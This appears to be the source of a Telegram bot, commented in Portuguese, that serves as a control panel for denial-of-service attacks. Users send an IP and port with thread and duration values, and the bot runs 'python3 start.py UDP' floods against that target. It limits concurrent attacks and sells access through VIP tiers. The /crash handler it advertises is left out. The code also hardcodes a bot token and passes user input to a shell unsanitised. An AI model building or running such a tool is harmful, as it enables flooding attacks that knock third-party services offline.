import telebot
import subprocess
import re
import time
from threading import Thread

BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}
authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
vip_users = []  # Lista de usuários VIP
vip_commands = []  # Comandos restritos a VIPs
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para validar o formato de IP e Porta
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    match = re.match(padrao, ip_porta)
    return match is not None

# Função para executar o comando do ataque
def executar_comando(ip_porta, threads, tempo):
    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
    try:
        processo = subprocess.Popen(
            comando_terminal, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        processos[ip_porta] = processo
        time.sleep(int(tempo))  # Aguarda o tempo do ataque
        processo.terminate()  # Termina o processo após o tempo especificado
        del processos[ip_porta]  # Remove o processo da lista
    except Exception as e:
        print(f"Erro ao executar o comando: {str(e)}")

# Função para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processos) >= MAX_ATTACKS:
        oldest_process = list(processos.values())[0]  # Pega o primeiro processo
        oldest_process.terminate()  # Termina o processo mais antigo
        del processos[list(processos.keys())[0]]  # Remove da lista de processos

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        "Bem-vindo ao bot! 🚀\n\n"
        "Aqui estão os comandos disponíveis para você:\n\n"
        "Comandos básicos:\n"
        "/crash <IP:PORTA> <threads> <tempo> - Envia um ataque ao IP especificado.\n"
        "/meuid - Mostra seu ID de usuário.\n\n"
        "Comandos para usuários autorizados e VIPs:\n"
        "/adduser <ID> - Adiciona um usuário autorizado.\n"
        "/removeuser <ID> - Remove um usuário autorizado.\n"
        "/promovervip <ID> - Promove um usuário a VIP. (Somente o dono pode)\n"
        "/rebaixarvip <ID> - Remove o status de VIP de um usuário. (Somente o dono pode)\n\n"
        "Comandos exclusivos do dono do bot:\n"
        "/addcomandovip <comando> - Restringe um comando para VIPs.\n"
        "/revcomandovip <comando> - Remove a restrição de comando VIP.\n\n"
        "Entre em contato se precisar de ajuda! 😉"
    )
    bot.send_message(message.chat.id, welcome_text)

# Comando /addcomandovip
@bot.message_handler(commands=['addcomandovip'])
def add_command_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Apenas o dono pode adicionar comandos VIP.")
        return

    comando = message.text.split()
    if len(comando) != 2:
        bot.send_message(message.chat.id, "Uso correto: /addcomandovip <comando>")
        return

    comando_vip = comando[1].lower()
    if comando_vip not in vip_commands:
        vip_commands.append(comando_vip)
        bot.send_message(message.chat.id, f"O comando '{comando_vip}' foi adicionado à lista de comandos VIP.")
    else:
        bot.send_message(message.chat.id, f"O comando '{comando_vip}' já está na lista de comandos VIP.")

# Comando /revcomandovip
@bot.message_handler(commands=['revcomandovip'])
def remove_command_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Apenas o dono pode remover comandos VIP.")
        return

    comando = message.text.split()
    if len(comando) != 2:
        bot.send_message(message.chat.id, "Uso correto: /revcomandovip <comando>")
        return

    comando_vip = comando[1].lower()
    if comando_vip in vip_commands:
        vip_commands.remove(comando_vip)
        bot.send_message(message.chat.id, f"O comando '{comando_vip}' foi removido da lista de comandos VIP.")
    else:
        bot.send_message(message.chat.id, f"O comando '{comando_vip}' não está na lista de comandos VIP.")

# Outros comandos, como /crash e /meuid (mesma lógica que já mostramos antes)

# Função para manter o bot ativo (reconectar automaticamente em caso de falhas)
def keep_alive():
    while True:
        try:
            bot.polling(timeout=60)
        except Exception as e:
            print(f"Erro no bot: {e}")
            time.sleep(15)  # Espera 15 segundos antes de tentar reconectar

# Iniciar o bot em uma thread separada para manter ele ativo
if __name__ == "__main__":
    keep_alive()